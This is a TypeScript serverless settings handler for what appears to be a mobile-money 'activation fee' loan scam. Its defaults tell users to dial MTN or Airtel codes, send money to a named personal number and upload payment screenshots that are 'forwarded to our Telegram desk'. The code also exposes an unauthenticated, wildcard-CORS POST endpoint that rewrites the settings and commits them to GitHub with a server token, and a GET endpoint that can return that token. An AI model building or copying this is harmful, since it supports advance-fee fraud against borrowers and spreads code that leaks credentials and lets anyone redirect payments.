import fs from 'fs';
import path from 'path';
import rawSettings from '../settings.json';

export interface AppSettings {
  agentName: string;
  agentNumber: string;
  rawNumber: string;
  whatsappNumber: string;
  whatsappRaw: string;
  step1: string;
  step2: string;
  step3: string;
  noticeText: string;
  githubToken?: string;
  githubRepo?: string;
}

export const defaultSettings: AppSettings = {
  agentName: rawSettings.agentName || 'MOMO DISBURSEMENT AGENT (EZRA KIBET)',
  agentNumber: rawSettings.agentNumber || '+254 780571549',
  rawNumber: rawSettings.rawNumber || '254780571549',
  whatsappNumber: rawSettings.whatsappNumber || '+254 780571549',
  whatsappRaw: rawSettings.whatsappRaw || '254780571549',
  step1: rawSettings.step1 || 'Dial *165*1*2# (MTN) or *185# (Airtel).',
  step2: rawSettings.step2 || "Enter recipient's number 254780571549 and amount.",
  step3: rawSettings.step3 || 'Take a screenshot of the confirmation SMS and upload it below.',
  noticeText: rawSettings.noticeText || 'Payment screenshot is verified and forwarded to our Telegram desk',
  githubToken: (rawSettings as any).githubToken || '',
  githubRepo: (rawSettings as any).githubRepo || 'supportmomoloans-glitch/Activation-fee-Uganda-mosticah',
};

declare global {
  // eslint-disable-next-line no-var
  var __momo_persistent_settings: AppSettings | undefined;
}

export function loadSettingsFromDisk(): AppSettings {
  // Priority 1: Check environment variable override (guaranteed across all Vercel serverless instances)
  if (process.env.APP_SETTINGS || process.env.SETTINGS_JSON) {
    try {
      const parsedEnv = JSON.parse(process.env.APP_SETTINGS || process.env.SETTINGS_JSON || '{}');
      return { ...defaultSettings, ...parsedEnv };
    } catch {}
  }

  // Priority 2: In-memory store in active process
  if (globalThis.__momo_persistent_settings) {
    return globalThis.__momo_persistent_settings;
  }

  // Priority 3: Read from disk (AI Studio, local server, or writable filesystem)
  const possiblePaths = [
    path.join(process.cwd(), 'settings.json'),
    path.join('/tmp', 'settings.json'),
  ];

  for (const p of possiblePaths) {
    try {
      if (fs.existsSync(p)) {
        const data = fs.readFileSync(p, 'utf-8');
        const parsed = JSON.parse(data);
        const merged = { ...defaultSettings, ...parsed };
        globalThis.__momo_persistent_settings = merged;
        return merged;
      }
    } catch {
      // try next path
    }
  }

  globalThis.__momo_persistent_settings = { ...defaultSettings };
  return defaultSettings;
}

export async function syncToGitHubIfConfigured(
  settings: AppSettings,
  token?: string,
  repo?: string
): Promise<{ success: boolean; message?: string }> {
  const ghToken = token || settings.githubToken || process.env.GITHUB_TOKEN || process.env.GH_TOKEN;
  const ghRepo =
    repo ||
    settings.githubRepo ||
    process.env.GITHUB_REPO ||
    (process.env.VERCEL_GIT_REPO_OWNER && process.env.VERCEL_GIT_REPO_SLUG
      ? `${process.env.VERCEL_GIT_REPO_OWNER}/${process.env.VERCEL_GIT_REPO_SLUG}`
      : 'supportmomoloans-glitch/Activation-fee-Uganda-mosticah');

  if (!ghToken || !ghRepo) {
    return { success: false, message: 'No GitHub token configured' };
  }

  try {
    const cleanRepo = ghRepo.replace(/^https?:\/\/github\.com\//, '').replace(/\.git$/, '');
    const cleanToken = ghToken.trim();

    // 1. Get current file sha
    let sha: string | undefined;
    const getRes = await fetch(`https://api.github.com/repos/${cleanRepo}/contents/settings.json`, {
      headers: {
        Authorization: `Bearer ${cleanToken}`,
        Accept: 'application/vnd.github.v3+json',
        'User-Agent': 'momo-loans-app',
      },
    });

    if (getRes.ok) {
      const getData = (await getRes.json()) as any;
      sha = getData.sha;
    }

    // Prepare settings without the secret token to keep repository clean
    const settingsToCommit = { ...settings };
    delete settingsToCommit.githubToken;

    const contentBase64 = Buffer.from(JSON.stringify(settingsToCommit, null, 2)).toString('base64');

    const putRes = await fetch(`https://api.github.com/repos/${cleanRepo}/contents/settings.json`, {
      method: 'PUT',
      headers: {
        Authorization: `Bearer ${cleanToken}`,
        Accept: 'application/vnd.github.v3+json',
        'Content-Type': 'application/json',
        'User-Agent': 'momo-loans-app',
      },
      body: JSON.stringify({
        message: 'Update settings.json via admin portal [skip ci]',
        content: contentBase64,
        sha,
      }),
    });

    if (putRes.ok) {
      return { success: true, message: 'Committed to GitHub repository! Vercel redeployment triggered.' };
    } else {
      const errData = (await putRes.json()) as any;
      return { success: false, message: errData.message || 'GitHub commit failed' };
    }
  } catch (err: any) {
    return { success: false, message: err.message || 'GitHub network error' };
  }
}

export async function saveSettingsToDisk(newSettings: Partial<AppSettings>): Promise<{
  settings: AppSettings;
  githubSynced?: boolean;
  githubMessage?: string;
}> {
  const current = loadSettingsFromDisk();
  const merged: AppSettings = { ...current, ...newSettings };
  globalThis.__momo_persistent_settings = merged;

  const targets = [
    path.join(process.cwd(), 'settings.json'),
    path.join('/tmp', 'settings.json'),
  ];

  for (const t of targets) {
    try {
      const cleanMerged = { ...merged };
      if (!cleanMerged.githubToken) delete cleanMerged.githubToken;
      fs.writeFileSync(t, JSON.stringify(cleanMerged, null, 2), 'utf-8');
    } catch {
      // in case directory is read-only
    }
  }

  let githubSynced = false;
  let githubMessage = '';
  const tokenToUse = newSettings.githubToken || merged.githubToken || process.env.GITHUB_TOKEN;
  if (tokenToUse) {
    const ghRes = await syncToGitHubIfConfigured(
      merged,
      tokenToUse,
      newSettings.githubRepo || merged.githubRepo
    );
    githubSynced = ghRes.success;
    githubMessage = ghRes.message || '';
  }

  return { settings: merged, githubSynced, githubMessage };
}

// Serverless Handler for Vercel
export default async function handler(req: any, res: any) {
  if (res && typeof res.setHeader === 'function') {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader(
      'Access-Control-Allow-Headers',
      'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );
  }

  if (req.method === 'OPTIONS') {
    return res.status ? res.status(200).end() : res.end();
  }

  if (req.method === 'POST') {
    try {
      let body = req.body;
      if (typeof body === 'string') {
        try {
          body = JSON.parse(body);
        } catch {
          body = {};
        }
      }
      const result = await saveSettingsToDisk(body || {});
      return res.status
        ? res.status(200).json({ ok: true, settings: result.settings, githubSynced: result.githubSynced, githubMessage: result.githubMessage })
        : res.end(JSON.stringify({ ok: true, settings: result.settings, githubSynced: result.githubSynced, githubMessage: result.githubMessage }));
    } catch (err: any) {
      return res.status ? res.status(500).json({ ok: false, error: err.message }) : res.end(JSON.stringify({ ok: false, error: err.message }));
    }
  }

  // GET
  const current = loadSettingsFromDisk();
  return res.status ? res.status(200).json({ ok: true, settings: current }) : res.end(JSON.stringify({ ok: true, settings: current }));
}
